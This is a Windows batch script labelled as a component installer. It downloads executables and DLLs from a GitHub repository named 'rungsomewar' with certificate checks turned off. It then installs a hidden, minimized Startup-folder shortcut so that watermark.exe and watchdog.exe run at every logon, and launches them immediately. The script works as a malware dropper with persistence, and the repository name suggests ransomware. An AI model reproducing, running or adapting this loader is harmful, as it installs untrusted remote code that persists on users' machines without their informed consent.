@echo off
setlocal
title Component Installer

:: Define Paths
set "TARGET_DIR=%LOCALAPPDATA%\rungsomewar"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Create folder if it doesn't exist
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo Downloading components using curl...

:: Download each file using your raw GitHub links
curl -k -L -o "%TARGET_DIR%\SDL2.dll" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/SDL2.dll"
curl -k -L -o "%TARGET_DIR%\SDL2_ttf.dll" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/SDL2_ttf.dll"
curl -k -L -o "%TARGET_DIR%\libfreetype-6.dll" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/libfreetype-6.dll"
curl -k -L -o "%TARGET_DIR%\zlib1.dll" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/zlib1.dll"
curl -k -L -o "%TARGET_DIR%\watermark.exe" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/watermark.exe"
curl -k -L -o "%TARGET_DIR%\watchdog.exe" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/watchdog.exe"

echo Setting up startup entry...

:: Create a launcher batch in the target folder
echo @echo off > "%TARGET_DIR%\run.bat"
echo cd /d "%%~dp0" >> "%TARGET_DIR%\run.bat"
echo start "" "watermark.exe" >> "%TARGET_DIR%\run.bat"
echo start "" "watchdog.exe" >> "%TARGET_DIR%\run.bat"

:: Create the Startup Link via PowerShell (one-liner to avoid syntax errors)
powershell -Command "$w=New-Object -ComObject WScript.Shell; $s=$w.CreateShortcut('%STARTUP_DIR%\rungsomewar.lnk'); $s.TargetPath='%TARGET_DIR%\run.bat'; $s.WindowStyle=7; $s.Save()"

echo Installation Complete. Starting applications...
start "" "%TARGET_DIR%\run.bat"
exit
